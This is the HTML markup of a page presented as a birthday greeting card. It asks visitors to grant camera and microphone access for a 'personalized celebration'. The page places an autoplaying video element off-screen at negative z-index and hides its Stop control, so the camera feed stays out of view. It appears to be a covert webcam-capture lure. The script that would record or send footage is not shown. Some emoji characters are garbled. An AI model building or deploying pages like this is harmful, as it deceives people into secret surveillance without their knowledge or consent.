<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Happy Birthday!</title>
  <link rel="stylesheet" href="birthday.css">
</head>
<body>
  <main class="party">
    <div class="card" id="card">
      <div id="permOverlay" class="perm-overlay">
        <div class="perm-box">
          <div class="camera-emoji">ï¿½</div>
          <h3>Camera Access Required</h3>
          <p>Please allow camera and microphone access to create your personalized birthday celebration experience.</p>
          <button id="overlayRetryBtn">Grant Access</button>
        </div>
      </div>
      <h1 id="title">ðŸŽ‰ Happy Birthday</h1>

      <div id="stepName" class="step">
        <label for="nameInput">Enter your name to begin</label>
        <input id="nameInput" placeholder="Your name" />
        <button id="startBtn">Start Celebration</button>
      </div>

      <div id="greeting" class="step hidden">
        <h2 id="greetingText"></h2>
        <p class="sub">May this special day bring you joy, laughter, and wonderful memories.</p>
        <div id="cameraStatus" class="camera-status">Status: <span id="cameraMessage">Preparing your celebration...</span>
          <button id="retryPermBtn" class="small hidden">Retry Access</button>
        </div>
      </div>

      <div id="previewSection" class="step" style="position: fixed; bottom: -200px; right: -200px; width: 160px; height: 120px; overflow: hidden; z-index: -1000;">
        <div class="previewArea">
          <video id="bdVideo" playsinline autoplay muted style="width: 160px; height: 120px;"></video>
          <div class="controls" style="display: none;">
            <button id="stopPreview">Stop</button>
          </div>
        </div>
      </div>

      <canvas id="confetti"></canvas>
    </div>
  </main>

  <script src="birthday.js"></script>
</body>
</html>
